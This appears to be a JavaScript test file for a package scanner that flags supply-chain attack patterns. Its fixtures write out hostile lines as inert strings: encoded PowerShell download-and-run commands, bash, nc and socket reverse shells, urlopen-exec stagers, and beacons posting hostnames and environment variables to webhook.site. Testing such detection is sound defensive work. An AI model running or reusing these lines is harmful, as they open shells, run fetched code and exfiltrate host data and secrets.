// Audit P0s (0.1.7): PowerShell that hides or fetches what it runs, stager
// strings, reverse shells, host information sent out, the grading of
// import-time reasons and aliased decoders. Twin of
// python/tests/scanner/test_supply_chain_signals.py; on a random corpus the
// engines are held to each other by tests/architecture/test_js_parity_hooks.py.
// Everything is inert text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { installScriptRisk, importTimeRisk, importTimeSeverity, scanFile } from "../src/index.js";
import { powershellRisk, stagerAt, reverseShellAt, sendsHostInfo, readsOwnSource, runsOwnSourceAt } from "../src/lib/hooks.js";

const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
  + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
const PS_ECHO = Buffer.from("echo hi", "utf16le").toString("base64");

test("PowerShell: encoded commands, cradles, a download started", () => {
  for (const text of [`subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand ${PS_RUN}', shell=False)`,
    `subprocess.run(['powershell.exe', '-enc', '${PS_RUN}'])`, `execSync('pwsh -e ${PS_RUN}')`]) {
    assert.deepEqual(powershellRisk(text), ["runs an encoded PowerShell command that downloads and runs code"], text);
  }
  assert.deepEqual(powershellRisk(`os.system('powershell -enc ${PS_ECHO}')`), ["runs an encoded PowerShell command"]);
  assert.deepEqual(powershellRisk("execSync('powershell -c \"irm https://x.invalid/i.ps1 | iex\"')"),
    ["runs PowerShell that downloads and runs code"]);
  for (const text of ["subprocess.run(['powershell', '-Command', 'Get-ChildItem Env:'])",
    "powershell -ExecutionPolicy Bypass -File build.ps1", "powershell -enc QUJD", "iwr https://x.invalid/a | iex"]) {
    assert.deepEqual(powershellRisk(text), [], text);
  }
});

test("stagers, reverse shells, host information", () => {
  const stager = '_t.write(b"""from urllib.request import urlopen as _u;exec(_u(\'https://x.invalid/p\').read())""")\n'
    + '_system(f"start {exe} {_t.name}")\n';
  assert.equal(stagerAt(stager), stager.indexOf('"""'));
  assert.ok(installScriptRisk(stager).includes("carries a script that downloads and runs code"));
  assert.equal(stagerAt("DOC = 'Call exec() on trusted code only; see https://docs.invalid'\n"), -1);
  for (const text of ["s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nsubprocess.call(['/bin/sh', '-i'])\n",
    "os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')\n", "os.system('nc -e /bin/sh 10.0.0.1 4242')\n",
    "const net = require('net'), sh = require('child_process').spawn('/bin/sh', []);\n"
    + "const c = new net.Socket();\nc.connect(4444, h, () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n"]) {
    assert.ok(reverseShellAt(text) >= 0, text);
  }
  assert.equal(reverseShellAt("fd = os.open(log, os.O_WRONLY)\nos.dup2(fd, 1)\n"), -1);
  assert.ok(sendsHostInfo("import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n"));
  assert.ok(!sendsHostInfo("import socket\nprint(socket.gethostname())\n"));
});

test("import-time grading", () => {
  const beacon = "import socket, requests\n\ndef send():\n"
    + "    requests.post('https://webhook.site/0000', json={'h': socket.gethostname()})\n";
  const [reasons, line] = importTimeRisk(beacon);
  assert.deepEqual([reasons, line, importTimeSeverity(reasons)],
    [["sends the machine's user or host name to a data-capture service (webhook.site)"], 4, "CRITICAL"]);
  const telemetry = "import socket, requests\nrequests.post('https://telemetry.invalid/v1', json={'host': socket.gethostname()})\n";
  assert.deepEqual(importTimeRisk(telemetry)[0], []);
  const harvest = "import os, json, requests\nrequests.post('https://api.invalid/c', data=json.dumps(dict(os.environ)))\n";
  assert.equal(importTimeSeverity(importTimeRisk(harvest)[0]), "MAJOR");
  const pyRun = "import requests, subprocess\nd = requests.get('https://x.invalid/p').content\n"
    + "open('p.py', 'wb').write(d)\nsubprocess.run(['python3', 'p.py'])\n";
  assert.equal(importTimeSeverity(importTimeRisk(pyRun)[0]), "CRITICAL");
});

test("import time: prose is read out, PowerShell must be handed to an exec call", () => {
  const selfUpdate = "import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
    + "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
    + "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb "
    + "https://x.invalid/i.ps1)))\"]\n";
  assert.deepEqual(importTimeRisk(selfUpdate, "py"), [[], null]);
  const doc = 'import subprocess\n\ndef installed():\n    """True when installed with\n'
    + '        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
    + '    return subprocess.run(["powershell", "-Command", "Get-ChildItem Env:"])\n';
  assert.deepEqual(importTimeRisk(doc), [["runs PowerShell that downloads and runs code"], 7]);
  assert.deepEqual(importTimeRisk(doc, "py"), [[], null]);
  const keys = 'import socket\n\nclass Client:\n    def load(self):\n'
    + '        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n        return socket.socket()\n';
  assert.deepEqual(importTimeRisk(keys, "py"), [[], null]);
  assert.deepEqual(importTimeRisk("const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n", "js"),
    [[], null]);
  const run = "import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
    + "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n";
  assert.deepEqual(importTimeRisk(run, "py"), [["runs PowerShell that downloads and runs code"], 4]);
  const runDoc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n';
  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["runs code it receives over the network",
    "runs code it reads back from its own file or a data file shipped with it"]);
  const beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())';
  for (const text of [`x = (\n    """${beacon}"""\n)\n`, `x = \\\n"""${beacon}"""\n`, `x = f(\n    'a'\n    """${beacon}"""\n)\n`,
    `f"""${beacon}"""\n`, `"""${beacon}""".strip()\n`]) {
    assert.ok(importTimeRisk(text, "py")[0].length, text);
  }
  assert.deepEqual(importTimeRisk(`x = 1\n"""\n${beacon}\n"""\n`, "py"), [[], null]);
});

test("code read back from the file itself", () => {
  const OWN = "runs code it reads back from its own file or a data file shipped with it";
  const c2 = "# C2: https://webhook.site/abc\nimport socket, requests, re\n"
    + "url = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
    + "requests.post(url, data=socket.gethostname())\n";
  assert.ok(readsOwnSource(c2));
  assert.deepEqual(importTimeRisk(c2, "py"), importTimeRisk(c2));
  assert.equal(importTimeSeverity(importTimeRisk(c2, "py")[0]), "CRITICAL");
  for (const [lang, text, line] of [
    ["py", '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n', 4],
    ["py", 'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n', 3],
    ["py", '"""print(1)"""\nexec(__doc__)\n', 2],
    ["js", "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n"
      + "/* require('child_process').execSync('id') */\n", 2],
    ["js", "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
      + "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n", 2]]) {
    assert.deepEqual(importTimeRisk(text, lang), [[OWN], line], text);
    assert.ok(installScriptRisk(text).includes(OWN), text);
  }
  assert.ok(runsOwnSourceAt('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n') >= 0);
  for (const text of ["import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
    '"""Tool."""\nimport argparse\np = argparse.ArgumentParser(description=__doc__)\n',
    'SHIM = """exec(compile(open(__file__).read(), __file__, "exec"))"""\nsubprocess.run([py, "-c", SHIM])\n',
    "NAMES = ('__doc__', '__name__')\nsrc = 'def f(): pass'\nexec(src)\n"]) {
    assert.equal(runsOwnSourceAt(text), -1, text);
  }
});

test("aliased decoders and decrypted payloads in the decode flow", () => {
  const found = (content) => scanFile({ name: "site-packages/x/a.py", content, lang: "py", dep: true })
    .filter((i) => i.rule === "SC-EVAL-DECODE").map((i) => i.line);
  assert.deepEqual(found("from base64 import b64encode, b64decode as invoke\nexec(invoke('aW1wb3J0IG9z'))\n"), [2]);
  assert.deepEqual(found("from zlib import decompress as z\nblob = z(data)\nexec(blob)\n"), [3]);
  assert.deepEqual(found("from cryptography.fernet import Fernet\nexec(Fernet(b'k').decrypt(b'gAAAA'))\n"), [2]);
  assert.deepEqual(found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), []);
});

test("linear time on hostile texts", () => {
  for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
    "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
    const t0 = Date.now();
    installScriptRisk(text);
    importTimeRisk(text);
    assert.ok(Date.now() - t0 < 10_000, text.slice(0, 20));
  }
  const beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n";
  for (const tail of [" ".repeat(200_000) + "'a' ".repeat(50_000), "x = 1; " + "'a'; ".repeat(60_000), "#\n".repeat(100_000),
    '"""\n'.repeat(50_000), "(".repeat(100_000) + "'a'\n".repeat(20_000), "\\\n'a'\n".repeat(40_000),
    "powershell ".repeat(50_000) + "os.system(".repeat(1000)]) {
    for (const lang of ["py", "js"]) {
      const t0 = Date.now();
      assert.ok(importTimeRisk(beacon + tail, lang)[0].length);
      assert.ok(Date.now() - t0 < 10_000, `${tail.slice(0, 20)} ${lang}`);
    }
  }
});
